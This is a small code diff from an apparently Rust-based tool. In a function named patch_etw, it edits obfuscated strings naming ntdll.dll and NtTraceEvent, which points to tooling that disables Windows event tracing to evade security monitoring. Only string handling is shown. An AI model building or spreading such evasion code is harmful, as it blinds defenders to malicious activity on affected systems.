@@ -46,10 +46,10 @@ use crate::parse_pe::PeFileParser;
 
 pub fn patch_etw() -> Result<(), anyhow::Error>
 {
-    let obfused_ntdll = obfuse!("ntdll.dll\0");
+    let obfused_ntdll = obfuse!("ntdll.dll");
     let ntdll_str = obfused_ntdll.as_str();
 
-    let obfused_nt_trace_event = obfuse!("NtTraceEvent\0");
+    let obfused_nt_trace_event = obfuse!("NtTraceEvent");
     let nt_trace_event_str = obfused_nt_trace_event.as_str();
 
     // exports.add(ntdll_str, nt_trace_event_str).expect("[ERROR] Finding address of NTTE.");
